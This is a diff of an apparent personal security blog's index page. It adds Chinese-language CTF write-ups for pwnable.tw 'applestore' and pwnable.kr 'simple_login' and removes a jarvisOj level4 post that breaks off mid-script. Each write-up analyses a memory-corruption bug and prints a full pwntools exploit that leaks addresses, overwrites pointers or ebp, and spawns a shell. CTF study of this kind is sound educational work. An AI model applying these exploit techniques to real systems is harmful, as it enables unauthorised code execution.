@@ -304,6 +304,385 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/applestore/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Talking is cheap, show me the code.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/07/applestore/" itemprop="url">
+                  pwnable.tw->applestore
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-01-07 14:43:59" itemprop="dateCreated datePublished" datetime="2019-01-07T14:43:59+08:00">2019-01-07</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwnable-tw/" itemprop="url" rel="index"><span itemprop="name">pwnable.tw</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/07/applestore/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/01/07/applestore/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/01/07/applestore/" class="leancloud_visitors" data-flag-title="pwnable.tw->applestore">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="pwnable-tw-gt-applestore"><a href="#pwnable-tw-gt-applestore" class="headerlink" title="pwnable.tw-&gt;applestore"></a>pwnable.tw-&gt;applestore</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学了一点fastbin attack之后开始重新刷题，但是pwnbale.tw对于我这菜鸡来说还是有点难，磕磕绊绊看着p4nda学长调了下来，感觉自己做题一点思路都没有，还是要踏实地学习</p>
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>F5之后发现程序还是有几个关键的功能，列出苹果产品，购买一个产品，删除一个产品，查看自己加入购物车的产品，结账</p>
+<p><img src="/2019/01/07/applestore/1.jpg" alt="main"></p>
+<p><img src="/2019/01/07/applestore/2.jpg" alt="main_func"></p>
+<p>有输入的地方都需要特别注意，选择功能这里的输入函数似乎没什么问题，因为其地址为ebp-0x22，read长度为0x15，没有越界写<br>下面挨个看下功能函数，list没东西，add里有个create子函数，里面是malloc一个地址，赋给这个结构体的name和price。这里说下找到的结构体，每次操作的基本单元就是这样一个结构体，成员包括商品名，价格，下个结构体地址，上个结构体地址。Add里create之后还会使用Insert函数在原链表后面插入新的节点，链表头在bss段的&amp;myCart处。<br><img src="/2019/01/07/applestore/3.jpg" alt="struct"></p>
+<p><img src="/2019/01/07/applestore/4.jpg" alt="add"></p>
+<p><img src="/2019/01/07/applestore/5.jpg" alt="create"></p>
+<p><img src="/2019/01/07/applestore/6.jpg" alt="insert"></p>
+<p>delete函数相比之下简单一些，输入item number，遍历寻找链表节点，将被删除节点的前一个节点的Next指向item-&gt;next，被删除节点的下一个节点的前一个节点指向item-&gt;last。  </p>
+<p><img src="/2019/01/07/applestore/7.jpg" alt="delete"></p>
+<p>cart函数从myCart开始依次输出商品的名字和价格</p>
+<p><img src="/2019/01/07/applestore/8.jpg" alt="cart"></p>
+<p>checkout函数比较有意思，cart会得到一个商品总价格，这个价格是7174的时候会将ebp-0x20处作为最后一个chunk插入链表。这个地址看起来也没什么问题，因为虽然是栈上地址，但是这里的函数没有read，无法溢出覆盖。但是这个if条件这么苛刻，漏洞一定就在这里，再看一下别的含有read的函数，这里可以想到虽然原函数里没有直接输入可以溢出，但是由于这些函数都是main_func调用的，每次给的函数栈都是一样的，所以checkout之后再调用cart，他们的函数栈都是分配的一样的，这就给了我们利用的机会。</p>
+<p><img src="/2019/01/07/applestore/9.jpg" alt="checkout"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>继续刚才的说，cart，delete，add函数里都有read的部分，这些函数可以溢出到最后一个chunk，cart里会有输出chunk-&gt;name,chunk-&gt;price的函数，以此可以泄露地址，而delete类似unlink，可以考虑构造unlink攻击。<br>首先是这个If条件，list里的价格是199、299、399、499。最终价格是7174，以4结尾，6<em>9=54,所以肯定是</em>6的数量，而最大是499，最小是199，所以最终应当是36-14之间，写个Python脚本，四个循环遍历一下就出来了，有很多结果，选一个简单的就是6个199，20个299的。  </p>
+<h3 id="泄露libc函数地址"><a href="#泄露libc函数地址" class="headerlink" title="泄露libc函数地址"></a>泄露libc函数地址</h3><p>思路：首先create6个199，20个299，进入checkout分配栈上地址，在cart函数里修改栈数据（由于read函数不受’\x00’影响，输入’y\x00abcd’不影响buf比较但是可以覆盖栈数据），name填read@got，打印出read的实际地址</p>
+<h3 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h3><p>思路：由于全局变量myCart存储的第一个struct的地址，因此name填&amp;myCart+8即可输入malloc的第一个chunk地址，再减去相应的偏移即可找到堆分配的基地址</p>
+<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>思路：能得到堆地址的基础上，我们可以每次填入chunk-&gt;next的地址，使得每次输入都是下一个chunk的地址，依此到第26次输出的chunk-&gt;next_addr就是stack_addr</p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>思路：这个结构体的删除类似unlink加上我们可以控制最后一个结构体的数据，可以使用unlink，但是unlink有副作用，FD-&gt;bk = BK = addr2,<em>(addr1+12)=addr2，BK-&gt;fd = FD，</em>(addr2+8) = addr1，如果直接覆盖return_addr为shell_addr，则要么addr1 = return_addr-12，要么addr2 = return_addr-8,第一种情况下会导致<em>(shell_addr+8)=return_addr-12，第二种情况</em>(shell_addr+12)=return_addr-8，都会有副作用，这里就要使用一个常见的套路，就是要覆盖调用函数的ebp，即FD=stack_addr，BK=ebp_addr-8，使得<em>ebp=stack_addr,这样的副作用是</em>(stack_addr+12)=ebp_addr-8，stack_addr是我们伪造的一个栈结构，其值为fake_ebp+system_addr+fake_ebp+’/bin/sh’_addr，这个副作用完全不影响我们的利用。<br>在被调函数执行完毕后，调用函数的ebp被换成了stack_addr，这样在leave ret的时候pop出fake_ebp，eip就指向system_addr了。这里的fake_stack我们可以选择handler里的可控区域.</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./applestore'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./applestore'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10104</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Device Number&gt; '</span>)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remove</span><span class="params">(number)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Item Number&gt; '</span>)</span><br><span class="line">    p.send(number)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LisApp</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Checkout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">Checkout()</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">payload = <span class="string">'y\x00'</span>+p32(read_got)+p32(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">LisApp(payload)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr =&gt; '</span> + hex(libc_base))</span><br><span class="line"><span class="comment">## leak heap addr</span></span><br><span class="line">payload = <span class="string">'y\x00'</span>+p32(<span class="number">0x0804b068</span>+<span class="number">8</span>)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">LisApp(payload)</span><br><span class="line">p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x410</span></span><br><span class="line">log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">heap_addr =  heap_base+<span class="number">0x410</span></span><br><span class="line"><span class="comment">## leak stack</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    payload = <span class="string">'y\x00'</span>+p32(heap_addr+<span class="number">8</span>)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    LisApp(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'27: '</span>)</span><br><span class="line">    heap_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    </span><br><span class="line">log.success(<span class="string">'stack addr =&gt; '</span> + hex(heap_addr))</span><br><span class="line"><span class="comment">## unlink</span></span><br><span class="line">return_addr = heap_addr + <span class="number">0x20</span> + <span class="number">4</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3a819</span></span><br><span class="line">stack_addr = heap_addr + <span class="number">0x60</span> <span class="number">-0x20</span></span><br><span class="line">addr1 = stack_addr</span><br><span class="line">addr2 = stack_addr + <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">payload = flat(<span class="string">'27'</span>,<span class="number">0</span>,<span class="number">0</span>,addr1,addr2)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number&gt; '</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">payload = <span class="string">'6\x00'</span></span><br><span class="line">esp = <span class="number">0xdeadbeef</span></span><br><span class="line">payload += flat(esp,system_addr,esp,esp)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/simple_login/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ama2in9">
+      <meta itemprop="description" content="Talking is cheap, show me the code.">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ama2in9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/07/simple_login/" itemprop="url">
+                  pwnable.kr->Simple Login
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-01-07 14:41:37" itemprop="dateCreated datePublished" datetime="2019-01-07T14:41:37+08:00">2019-01-07</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/07/simple_login/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/01/07/simple_login/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/01/07/simple_login/" class="leancloud_visitors" data-flag-title="pwnable.kr->Simple Login">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="pwnable-kr-gt-simple-login"><a href="#pwnable-kr-gt-simple-login" class="headerlink" title="pwnable.kr-&gt;simple_login"></a>pwnable.kr-&gt;simple_login</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个题目是从apple store那里看p4nda学长的wp来的，那道题最后用到了这个题的技巧，因此我也做了一下这个来加深记忆</p>
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>F5之后发现程序的逻辑比较简单，有一个bss段的全局变量input，输入限制长度为30，且根据函数名可以看到输入的数据应当是base64编码之后的结果，之后会先进行一次base64解码，判断解码长度不大于12，在进入auth函数把输入的解码结果memcpy到v4，这里是漏洞的触发点，v4地址为ebp-8，但是输入最长可以是12，因此可以覆盖到ebp，但也只能覆盖ebp。程序里有system调用处，可以在Gdb里直接b*correct找到其地址</p>
+<p><img src="/2019/01/07/simple_login/1.jpg" alt="main"></p>
+<p><img src="/2019/01/07/simple_login/2.jpg" alt="auth"></p>
+<p><img src="/2019/01/07/simple_login/3.jpg" alt="system"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里一个知识点比较关键，我们假设调用函数为A，被调函数为B，则B函数的ebp的值实际上是A函数ebp的地址，因此我们覆盖B函数的ebp时填入一块假的内存块的地址，这个地址的值模拟ebp和返回地址及参数。当被调函数返回的时候ebp被Pop出来作为原函数的ebp地址，最终实现eip劫持</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x804929c')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9003</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Authenticate : '</span>)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">shell_addr = <span class="number">0x8049284</span></span><br><span class="line">input_addr = <span class="number">0x811EB40</span></span><br><span class="line">payload = flat(<span class="string">'aaaa'</span>,shell_addr,input_addr)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/heap_attack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1815,380 +2194,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/jarvisOj-level4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ama2in9">
-      <meta itemprop="description" content="Talking is cheap, show me the code.">
-      <meta itemprop="image" content="/images/head.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ama2in9">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/25/jarvisOj-level4/" itemprop="url">
-                  jarvisOj-level4
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-11-25 16:42:46" itemprop="dateCreated datePublished" datetime="2018-11-25T16:42:46+08:00">2018-11-25</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/jarvisOj/" itemprop="url" rel="index"><span itemprop="name">jarvisOj</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/25/jarvisOj-level4/#comments" itemprop="discussionUrl">
-                
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/11/25/jarvisOj-level4/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/11/25/jarvisOj-level4/" class="leancloud_visitors" data-flag-title="jarvisOj-level4">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Views: </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="jarvis-gt-level4"><a href="#jarvis-gt-level4" class="headerlink" title="jarvis-&gt;level4"></a>jarvis-&gt;level4</h1><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出</p>
-<p><img src="/2018/11/25/jarvisOj-level4/1.jpg" alt="code"><br><img src="/2018/11/25/jarvisOj-level4/2.jpg" alt="code2"></p>
-<p>查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。</p>
-<p><img src="/2018/11/25/jarvisOj-level4/3.jpg" alt="protection"></p>
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和’/bin/sh’的地址即可，但是在调试过程中发现程序中并没有现成的地址，因此要想办法自己获取Libc中的地址</p>
-<p><img src="/2018/11/25/jarvisOj-level4/4.jpg" alt="info"></p>
-<p>由于题目中没有给libc，我开始使用的是一个库Libcsearcher，基于libcdatabase，但是事实证明不太好使，找不到对应的libc，也可能是我使用姿势不对，之后想到用pwntools自带的DynELF配合leak得到system函数的地址，之后使用read将’/bin/sh’写入.bss段中，调用system(‘.bss_addr’)即可拿到shell</p>
-<p>代码里的leak函数是使用一种持续化泄露函数地址的方式讲指定的address输出出来，借此找到libc,后面的payload是使用read从用户输入中获取’/bin/sh’，之后三个pop将栈里的read三个参数都弹出栈，到ret的时候esp就是system_addr，它的参数是bss段的地址(可以用IDA查看)</p>
-<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"info"</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    padding = <span class="string">'A'</span> * <span class="number">0x8c</span></span><br><span class="line">    write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">    vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">    payload = padding + p32(write_plt) + p32(vulnearbale_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ret = <span class="number">0x08048509</span></span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">0x8C</span></span><br><span class="line">vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">payload = padding + p32(read_plt) + p32(pop_ret) +p32(<span class="number">0</span>) + p32(bss_addr)\</span><br><span class="line">        + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulnearbale_addr) +p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span 